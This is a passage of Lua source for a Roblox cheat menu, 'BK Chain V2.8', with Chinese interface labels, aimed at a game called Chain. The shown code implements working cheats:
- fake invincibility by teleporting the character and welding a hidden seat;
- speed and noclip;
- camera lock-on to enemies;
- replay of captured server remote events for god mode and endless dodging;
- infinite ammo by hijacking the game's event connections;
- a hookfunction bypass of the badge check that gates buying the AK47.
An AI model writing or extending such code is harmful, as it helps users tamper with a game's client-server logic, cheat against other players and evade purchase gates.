                seat.Anchored = false
                seat.CanCollide = false
                seat.Transparency = 1
                seat.Position = Vector3.new(95, 84, 37.55)
                seat.Parent = workspace
                
                local weld = Instance.new("Weld")
                weld.Part0 = seat
                weld.Part1 = torso
                weld.Parent = seat
                
                task.wait()
                seat.CFrame = State.PseudoGodReturnPos
                pseudoGodData.Seat = seat
                
                task.wait(0.5)
                blackGui:Destroy()
                
                WindUI:Notify({
                    Title = "伪无敌",
                    Content = "已开启-请确保本体在安全位置",
                    Duration = 4,
                    Icon = "alert-triangle"
                })
            end
        else
            if pseudoGodData.Seat then
                local char = lp.Character
                if char then
                    local hrp = char:FindFirstChild("HumanoidRootPart")
                    if hrp and State.PseudoGodReturnPos then
                        local blackGui = Instance.new("ScreenGui")
                        blackGui.Name = "_BlackScreen"
                        blackGui.IgnoreGuiInset = true
                        blackGui.DisplayOrder = 999
                        blackGui.Parent = lp.PlayerGui
                        
                        local blackFrame = Instance.new("Frame")
                        blackFrame.BackgroundColor3 = Color3.new(0, 0, 0)
                        blackFrame.Size = UDim2.new(1, 0, 1, 0)
                        blackFrame.BorderSizePixel = 0
                        blackFrame.Parent = blackGui
                        
                        hrp.CFrame = State.PseudoGodReturnPos
                        
                        task.wait(0.5)
                        blackGui:Destroy()
                    end
                end
                pseudoGodData.Seat:Destroy()
                pseudoGodData.Seat = null
            end
            WindUI:Notify({
                Title = "伪无敌",
                Content = "已关闭",
                Duration = 2,
                Icon = "xmark"
            })
        end
        PseudoGodToggle:SetValue(v)
    end,
})

Tabs.FuncTab:Toggle({
    Title = "朝向 Chain",
    Value = false,
    Callback = function(v)
        State.FaceChain = v
    end,
})

Tabs.FuncTab:Section({ Title = "速度 & 视野" })

Tabs.FuncTab:Toggle({
    Title = "速度",
    Value = false,
    Callback = function(v)
        State.SpeedBoost = v
        speedData.Active = v
        setupSpeedBoost()
        WindUI:Notify({
            Title = "速度",
            Content = v and "已开启" or "已关闭",
            Duration = 2
        })
    end,
})

Tabs.FuncTab:Slider({
    Title = "速度倍率",
    Value = {
        Min = 0.5,
        Max = 20,
        Default = 1
    },
    Callback = function(v)
        State.SpeedValue = v
        speedData.Speed = v
    end,
})

Tabs.FuncTab:Toggle({
    Title = "第三人称",
    Value = false,
    Callback = function(v)
        State.ThirdPerson = v
        tp3.Active = v
        if v then
            enforceThirdPerson()
        else
            pcall(function()
                lp.CameraMode = Enum.CameraMode.LockFirstPerson
            end)
            if tp3.Conn then tp3.Conn:Disconnect() end
        end
    end,
})

Tabs.FuncTab:Toggle({
    Title = "穿墙",
    Desc = "已失效后续修复",
    Value = false,
    Callback = function(v)
        State.Noclip = v
        Noclip()
        WindUI:Notify({
            Title = "穿墙",
            Content = v and "已开启" or "已关闭",
            Duration = 3,
            Icon = v and "check-circle" or "xmark"
        })
    end,
})

Tabs.FuncTab:Section({ Title = "Chain 预警" })

Tabs.FuncTab:Toggle({
    Title = "启用 Chain 预警",
    Value = false,
    Callback = function(v)
        State.ChainAlert = v
        cAlert.Active = v
        setupChainAlert()
    end,
})

Tabs.FuncTab:Toggle({
    Title = "自动躲避",
    Desc = "有致命bug，无论多远都会传送，请勿常开",
    Value = false,
    Callback = function(v)
        if State.PseudoGod and v then
            WindUI:Notify({
                Title = "无法开启",
                Content = "伪无敌期间无法使用自动躲避",
                Duration = 3,
                Icon = "alert-triangle"
            })
            return
        end
        State.ChainDodge = v
        cAlert.Dodge = v
        WindUI:Notify({
            Title = "自动躲避",
            Content = v and "已开启" or "已关闭",
            Duration = 4,
            Icon = v and "alert-triangle" or "xmark"
        })
    end,
})

Tabs.FuncTab:Toggle({
    Title = "显示光环",
    Value = true,
    Callback = function(v)
        State.ChainRing = v
        cAlert.ShowRing = v
        setupChainAlert()
    end,
})

Tabs.FuncTab:Toggle({
    Title = "旋转光环",
    Value = true,
    Callback = function(v)
        State.ChainRotate = v
        cAlert.RingRotating = v
    end,
})

Tabs.FuncTab:Slider({
    Title = "预警范围大小",
    Value = {
        Min = 30,
        Max = 100,
        Default = 55
    },
    Callback = function(v)
        State.ChainRingRadius = v
        cAlert.RingRadius = v
        setupChainAlert()
    end,
})

-- ================= 新增：自动无限闪避 & 无敌 UI 开关 =================
Tabs.FuncTab:Section({ Title = "自动闪避与无敌" })

local dodgeToggle = Tabs.FuncTab:Toggle({
    Title = "自动无限闪避",
    Desc = "开启后先放一次闪避",
    Value = false,
    Callback = function(v)
        State.AutoDodge = v
        if v then
            capturingCTS = true
            LastCTSArgs = nil
            if dodgeLoop then dodgeLoop:Disconnect() end
            dodgeLoop = RS.Heartbeat:Connect(function(dt)
                if not CTS or not CTS.Parent then
                    refreshCTS()
                end
                if CTS and LastCTSArgs then
                    if tick() % 0.7 < dt then
                        CTS:FireServer(unpack(LastCTSArgs))
                    end
                end
            end)
        else
            capturingCTS = false
            if dodgeLoop then dodgeLoop:Disconnect(); dodgeLoop = nil end
        end
    end,
})

local godToggle = Tabs.FuncTab:Toggle({
    Title = "无敌",
    Desc = "开启后先空放一次特殊攻击",
    Value = false,
    Callback = function(v)
        State.GodMode = v
        if v then
            capturingInteract = true
            LastInteractArgs = nil
            lastFire = 0
            if godLoop then godLoop:Disconnect() end
            godLoop = RS.Heartbeat:Connect(function(dt)
                if not Interact or not Interact.Parent then
                    refreshInteract()
                end
                if Interact and LastInteractArgs and (tick() - lastFire >= 1) then
                    lastFire = tick()
                    Interact:FireServer(unpack(LastInteractArgs))
                end
            end)
        else
            capturingInteract = false
            if godLoop then godLoop:Disconnect(); godLoop = nil end
        end
    end,
})
-- ================= 新增结束 =================

local RemoteSection = Tabs.RemoteTab:Section({
    Title = "远程UI & 快捷键",
    Opened = true
})

RemoteSection:Toggle({
    Title = "商店界面",
    Value = false,
    Callback = function(v)
        if v and not isDaytime() then
            WindUI:Notify({
                Title = "无法开启",
                Content = "商店只能在白天打开",
                Duration = 2,
                Icon = "xmark"
            })
            return
        end
        SetRemoteGui("Shop", v)
    end,
})

RemoteSection:Paragraph({
    Title = "警告",
    Desc = "黑夜不能买商店物品，否则会被踢出游戏",
    Color = "Red"
})

RemoteSection:Keybind({
    Title = "商店快捷键",
    Value = Enum.KeyCode.V,
    Callback = function(v)
        if v and not isDaytime() then
            WindUI:Notify({
                Title = "无法开启",
                Content = "商店只能在白天打开",
                Duration = 2,
                Icon = "xmark"
            })
            return
        end
        SetRemoteGui("Shop", v)
    end,
})

RemoteSection:Toggle({
    Title = "分解机界面",
    Value = false,
    Callback = function(v)
        SetRemoteGui("Deconstructor", v)
    end,
})

RemoteSection:Paragraph({
    Title = "警告",
    Desc = "会吃材料请前往工作间",
    Color = "Red"
})

RemoteSection:Keybind({
    Title = "分解机快捷键",
    Value = Enum.KeyCode.B,
    Callback = function(v)
        SetRemoteGui("Deconstructor", v)
    end,
})

RemoteSection:Toggle({
    Title = "工作台界面",
    Value = false,
    Callback = function(v)
        SetRemoteGui("Workbench", v)
    end,
})

RemoteSection:Paragraph({
    Title = "警告",
    Desc = "会吃材料请前往工作间",
    Color = "Red"
})

RemoteSection:Keybind({
    Title = "工作台快捷键",
    Value = Enum.KeyCode.N,
    Callback = function(v)
        SetRemoteGui("Workbench", v)
    end,
})

RemoteSection:Section({ Title = "伪无敌快捷键" })

RemoteSection:Keybind({
    Title = "伪无敌快捷键",
    Value = Enum.KeyCode.F4,
    Callback = function(v)
        State.PseudoGod = not State.PseudoGod
        if State.PseudoGod then
            State.ChainDodge = false
            cAlert.Dodge = false
            
            local char = lp.Character
            local hrp = char and char:FindFirstChild("HumanoidRootPart")
            local torso = char and (char:FindFirstChild("Torso") or char:FindFirstChild("UpperTorso"))
            
            if hrp and torso then
                State.PseudoGodReturnPos = hrp.CFrame
                
                local blackGui = Instance.new("ScreenGui")
                blackGui.Name = "_BlackScreen"
                blackGui.IgnoreGuiInset = true
                blackGui.DisplayOrder = 999
                blackGui.Parent = lp.PlayerGui
                
                local blackFrame = Instance.new("Frame")
                blackFrame.BackgroundColor3 = Color3.new(0, 0, 0)
                blackFrame.Size = UDim2.new(1, 0, 1, 0)
                blackFrame.BorderSizePixel = 0
                blackFrame.Parent = blackGui
                
                hrp.CFrame = CFrame.new(-25.95, 84, 3537.55)
                task.wait(0.15)
                
                local seat = Instance.new("Seat")
                seat.Name = ""
                seat.Anchored = false
                seat.CanCollide = false
                seat.Transparency = 1
                seat.Position = Vector3.new(95, 84, 37.55)
                seat.Parent = workspace
                
                local weld = Instance.new("Weld")
                weld.Part0 = seat
                weld.Part1 = torso
                weld.Parent = seat
                
                task.wait()
                seat.CFrame = State.PseudoGodReturnPos
                pseudoGodData.Seat = seat
                
                task.wait(0.5)
                blackGui:Destroy()
                
                WindUI:Notify({
                    Title = "伪无敌",
                    Content = "已开启",
                    Duration = 2,
                    Icon = "check"
                })
            end
        else
            if pseudoGodData.Seat then
                local char = lp.Character
                if char then
                    local hrp = char:FindFirstChild("HumanoidRootPart")
                    if hrp and State.PseudoGodReturnPos then
                        local blackGui = Instance.new("ScreenGui")
                        blackGui.Name = "_BlackScreen"
                        blackGui.IgnoreGuiInset = true
                        blackGui.DisplayOrder = 999
                        blackGui.Parent = lp.PlayerGui
                        
                        local blackFrame = Instance.new("Frame")
                        blackFrame.BackgroundColor3 = Color3.new(0, 0, 0)
                        blackFrame.Size = UDim2.new(1, 0, 1, 0)
                        blackFrame.BorderSizePixel = 0
                        blackFrame.Parent = blackGui
                        
                        hrp.CFrame = State.PseudoGodReturnPos
                        
                        task.wait(0.5)
                        blackGui:Destroy()
                    end
                end
                pseudoGodData.Seat:Destroy()
                pseudoGodData.Seat = null
            end
            WindUI:Notify({
                Title = "伪无敌",
                Content = "已关闭",
                Duration = 2,
                Icon = "xmark"
            })
        end
        PseudoGodToggle:SetValue(State.PseudoGod)
    end,
})

RemoteSection:Section({ Title = "无限子弹快捷键" })

RemoteSection:Keybind({
    Title = "无限子弹快捷键",
    Value = Enum.KeyCode.F5,
    Callback = function(v)
        State.InfAmmo = not State.InfAmmo
        toggleInfAmmo()
        WindUI:Notify({
            Title = "无限弹药",
            Content = State.InfAmmo and "已开启" or "已关闭",
            Duration = 2,
            Icon = State.InfAmmo and "check" or "xmark"
        })
        InfAmmoToggle:SetValue(State.InfAmmo)
    end,
})

RemoteSection:Section({ Title = "特殊功能" })

local bypassAK_original = nil
RemoteSection:Toggle({
    Title = "绕过AK购买徽章",
    Value = false,
    Callback = function(v)
        if v then
            task.spawn(function()
                local BadgeService = game:GetService("BadgeService")
                bypassAK_original = BadgeService.UserHasBadgeAsync
                local old = hookfunction(BadgeService.UserHasBadgeAsync, function(self, userId, badgeId)
                    if badgeId == 1224768178420330 then
                        return true
                    end
                    return bypassAK_original(self, userId, badgeId)
                end)
                WindUI:Notify({
                    Title = "绕过成功",
                    Content = "AK47购买徽章已绕过",
                    Duration = 10,
                    Icon = "check-circle"
                })
            end)
        else
            if bypassAK_original then
                hookfunction(game:GetService("BadgeService").UserHasBadgeAsync, bypassAK_original)
                bypassAK_original = null
                WindUI:Notify({
                    Title = "绕过关闭",
                    Content = "AK购买徽章绕过已关闭",
                    Duration = 3,
                    Icon = "xmark"
                })
            end
        end
    end,
})

local themes = WindUI:GetThemes()
local themeValues = {}
for name in pairs(themes) do table.insert(themeValues, name) end

Tabs.SettingsTab:Dropdown({
    Title = "选择主题",
    Multi = false,
    AllowNone = false,
    Value = WindUI:GetCurrentTheme(),
    Values = themeValues,
    Callback = function(theme)
        WindUI:SetTheme(theme)
    end,
})

Tabs.SettingsTab:Toggle({
    Title = "窗口透明",
    Value = WindUI:GetTransparency(),
    Callback = function(v)
        Window:ToggleTransparency(v)
    end,
})

local infAmmoActive = false
local ammoConns = {}

local gunMax = {
    AK47 = 20,
    Deagle = 7,
    DoubleBarrel = 2,
    M1911 = 7
}

local origSyncFunc = null

local function setupAmmoHooks()
    for _, c in ipairs(ammoConns) do pcall(function() c:Disconnect() end) end
    ammoConns = {}
    
    local char = lp.Character
    if not char then return end
    
    local items = char:FindFirstChild("Items")
    if not items then return end
    
    local ch = char:FindFirstChild("CharacterHandler")
    if not ch then return end
    
    local remotes = ch:FindFirstChild("Contents") and ch.Contents:FindFirstChild("Remotes")
    if not remotes then return end
    
    local interact = remotes:FindFirstChild("Interact")
    if not interact then return end
    
    local conns = getconnections(interact.OnClientEvent)
    if conns and #conns > 0 then
        local origConn = conns[1]
        origSyncFunc = origConn.Function
        origConn:Disable()
        
        local newConn = interact.OnClientEvent:Connect(function(action, gunName, ammoData)
            if infAmmoActive and action == "Sync" and gunMax[gunName] then
                ammoData = {gunMax[gunName], 999}
            end
            pcall(origSyncFunc, action, gunName, ammoData)
        end)
        table.insert(ammoConns, newConn)
    end
    
    for gunName, maxAmmo in pairs(gunMax) do
        local gun = items:FindFirstChild(gunName)
        if gun then
            local c1 = gun:GetAttributeChangedSignal("Ammo"):Connect(function()
                if not infAmmoActive then return end
                local val = gun:GetAttribute("Ammo")
                if val and val < maxAmmo then
                    gun:SetAttribute("Ammo", maxAmmo)
                end
            end)
            
            local c2 = gun:GetAttributeChangedSignal("Reserve"):Connect(function()
                if not infAmmoActive then return end
                local val = gun:GetAttribute("Reserve")
                if val and val < 999 then
                    gun:SetAttribute("Reserve", 999)
                end
            end)
            
            table.insert(ammoConns, c1)
            table.insert(ammoConns, c2)
            
            gun:SetAttribute("Ammo", maxAmmo)
            gun:SetAttribute("Reserve", 999)
        end
    end

    pcall(function()
        local playerGui = lp:FindFirstChild("PlayerGui")
        local ingame = playerGui and playerGui:FindFirstChild("Ingame")
        local mechanics = ingame and ingame:FindFirstChild("MechanicsFrame")
        local gunUI = mechanics and mechanics:FindFirstChild("GunUI")
        if gunUI then
            local ammoText = gunUI:FindFirstChild("Ammo")
            local reserveText = gunUI:FindFirstChild("AmmoInStore")
            if ammoText then
                local c = ammoText:GetPropertyChangedSignal("Text"):Connect(function()
                    if not infAmmoActive then return end
                    for gunName, maxAmmo in pairs(gunMax) do
                        local gun = items:FindFirstChild(gunName)
                        if gun and gun:GetAttribute("Equipped") then
                            ammoText.Text = tostring(maxAmmo)
                            return
                        end
                    end
                end)
                table.insert(ammoConns, c)
            end
            if reserveText then
                local c = reserveText:GetPropertyChangedSignal("Text"):Connect(function()
                    if not infAmmoActive then return end
                    reserveText.Text = "999"
                end)
                table.insert(ammoConns, c)
            end
        end
    end)
end

local function startInfAmmoLoop()
    task.spawn(function()
        while infAmmoActive do
            pcall(function()
                local char = lp.Character
                local items = char and char:FindFirstChild("Items")
                if items then
                    for gunName, maxAmmo in pairs(gunMax) do
                        local gun = items:FindFirstChild(gunName)
                        if gun then
                            gun:SetAttribute("Ammo", maxAmmo)
                            gun:SetAttribute("Reserve", 999)
                            if origSyncFunc then
                                pcall(origSyncFunc, "Sync", gunName, {maxAmmo, 999})
                            end
                        end
                    end
                end
            end)
            task.wait(0.1)
        end
    end)
end

function toggleInfAmmo()
    infAmmoActive = not infAmmoActive
    if infAmmoActive then
        setupAmmoHooks()
        startInfAmmoLoop()
        pcall(function()
            local char = lp.Character
            local items = char and char:FindFirstChild("Items")
            if items then
                for gunName, maxAmmo in pairs(gunMax) do
                    local gun = items:FindFirstChild(gunName)
                    if gun then
                        gun:SetAttribute("Ammo", maxAmmo)
                        gun:SetAttribute("Reserve", 999)
                    end
                end
            end
        end)
    else
        for _, c in ipairs(ammoConns) do pcall(function() c:Disconnect() end) end
        ammoConns = {}
    end
end

task.spawn(function()
    while task.wait(0.1) do
        if State.InfStamina and lp.Character then
            pcall(function()
                lp.Character:FindFirstChild("Stats").Stamina.Value = 100
            end)
        end
    end
end)

task.spawn(function()
    while task.wait(0.1) do
        if State.InfCombatStamina and lp.Character then
            pcall(function()
                lp.Character:FindFirstChild("Stats").CombatStamina.Value = 100
            end)
        end
    end
end)

task.spawn(function()
    while task.wait(0.1) do
        if State.InfGas and lp.Character then
            pcall(function()
                local XSaw = lp.Character:FindFirstChild("Items") and lp.Character.Items:FindFirstChild("XSaw")
                if XSaw then
                    XSaw:SetAttribute("Gas", 100)
                end
            end)
        end
    end
end)

task.spawn(function()
    while task.wait(0.005) do
        if State.WinClash and lp.Character then
            pcall(function()
                lp.Character:FindFirstChild("Stats").ClashStrength.Value = 100
            end)
        end
    end
end)

task.spawn(function()
    while task.wait(0.03) do
        if State.FaceChain then
            pcall(function()
                local nearest, nearDist = null, math.huge
                for _, chain in ipairs(aiFolder:GetChildren()) do
                    if chain:IsA("Model") then
                        local cHRP = chain:FindFirstChild("HumanoidRootPart")
                        local cHum = chain:FindFirstChild("Humanoid")
                        if cHRP and cHum and cHum.Health > 0 then
                            local dist = (Cam.CFrame.Position - cHRP.Position).Magnitude
                            if dist < nearDist then
                                nearDist = dist
                                nearest = cHRP
                            end
                        end
                    end
                end
                if nearest then
                    Cam.CFrame = CFrame.lookAt(Cam.CFrame.Position, nearest.Position)
                end
            end)
        end
    end
end)

lp.CharacterAdded:Connect(function()
    if infAmmoActive then
        task.wait(1)
        setupAmmoHooks()
    end
    if State.NoRecoil then
        task.wait(1)
        hookRecoil()
    end
end)

WindUI:Notify({
    Title = "ChainBK已加载",
    Content = "欢迎使用BK Chain V2.8",
    Duration = 5,
    Icon = "check-circle",
})

print("源码来自神秘鱼")    
